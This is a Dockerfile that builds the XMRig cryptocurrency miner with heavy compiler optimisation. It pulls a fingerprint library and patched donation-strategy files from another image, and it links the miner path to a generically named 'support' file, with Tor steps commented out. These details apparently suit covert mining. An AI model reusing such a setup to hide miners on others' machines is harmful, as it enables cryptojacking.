FROM innovanon/ia-tither-3 as sanity-check
RUN find $PREFIX -iname '*libfingerprint*'

FROM innovanon/void-base as builder-2

ARG CPPFLAGS
ARG   CFLAGS
ARG CXXFLAGS
ARG  LDFLAGS

#ENV CHOST=x86_64-linux-gnu

ENV CPPFLAGS="$CPPFLAGS"
ENV   CFLAGS="$CFLAGS"
ENV CXXFLAGS="$CXXFLAGS"
ENV  LDFLAGS="$LDFLAGS"

#ENV PREFIX=/usr/local
ENV PREFIX=/opt/cpuminer

ARG ARCH=native
ENV ARCH="$ARCH"

#ENV CPPFLAGS="-DUSE_ASM $CPPFLAGS"
ENV   CFLAGS="-march=$ARCH -mtune=$ARCH $CFLAGS"

# PGO
ENV   CFLAGS="-fprofile-correction -fprofile-use=/var/cpuminer  $CFLAGS"
ENV  LDFLAGS="-fprofile-correction -fprofile-use=/var/cpuminer $LDFLAGS"

# Debug
#ENV CPPFLAGS="-DNDEBUG $CPPFLAGS"
ENV   CFLAGS="-Ofast -g0 $CFLAGS"

# Static
#ENV  LDFLAGS="$LDFLAGS -static -static-libgcc -static-libstdc++"

# LTO
ENV   CFLAGS="-fuse-linker-plugin -flto $CFLAGS"
ENV  LDFLAGS="-fuse-linker-plugin -flto $LDFLAGS"
##ENV   CFLAGS="-fuse-linker-plugin -flto -ffat-lto-objects $CFLAGS"
##ENV  LDFLAGS="-fuse-linker-plugin -flto -ffat-lto-objects $LDFLAGS"

# Dead Code Strip
ENV   CFLAGS="-ffunction-sections -fdata-sections $CFLAGS"
ENV  LDFLAGS="-Wl,-s -Wl,-Bsymbolic -Wl,--gc-sections $LDFLAGS"
##ENV  LDFLAGS="-Wl,-Bsymbolic -Wl,--gc-sections $LDFLAGS"

# Optimize
#ENV   CLANGFLAGS="-ffast-math -fassociative-math -freciprocal-math -fmerge-all-constants $CFLAGS"
#ENV       CFLAGS="-fipa-pta -floop-nest-optimize -fgraphite-identity -floop-parallelize-all $CLANGFLAGS"
ENV CFLAGS="-fmerge-all-constants $CFLAGS"

#ENV CLANGXXFLAGS="$CLANGFLAGS $CXXFLAGS"
ENV CXXFLAGS="$CFLAGS $CXXFLAGS"

WORKDIR /tmp

#COPY    ./libevent.sh    ./
#RUN     ./libevent.sh  2

#COPY    ./tor.sh         ./
#RUN     ./tor.sh       2

#COPY    ./libuv.sh       ./
#RUN     ./libuv.sh     2

#COPY    ./hwloc.sh       ./
#RUN     ./hwloc.sh     2

COPY                 ./var/cpuminer/ /var/cpuminer/
COPY --from=innovanon/ia-tither-3 $PREFIX/lib/libfingerprint.a $PREFIX/lib/libfingerprint.a
COPY --from=innovanon/ia-tither-3 /tmp/xmrig/      /tmp/
COPY --from=innovanon/ia-tither-3 /tmp/xmrig.sh           \
                    /tmp/donate.h.sed       \
                    /tmp/DonateStrategy.cpp \
                    /tmp/Config_default.h   \
                                     /tmp/
RUN     ./xmrig.sh     2 \
 && rm -rf /tmp/*

#FROM scratch as squash
#COPY --from=builder / /
#RUN chown -R tor:tor /var/lib/tor
#SHELL ["/usr/bin/bash", "-l", "-c"]
#ARG TEST
#
#FROM squash as test
#ARG TEST
#RUN tor --verify-config \
# && sleep 127           \
# && xbps-install -S     \
# && exec true || exec false
#
#FROM squash as final
#VOLUME /var/cpuminer
#ENTRYPOINT []

# TODO
RUN ldd $PREFIX/bin/xmrig

RUN ln -sfv /usr/local/bin/support $PREFIX/bin/xmrig
# TODO
ENTRYPOINT ["/usr/bin/bash", "-l", "-c", ""]

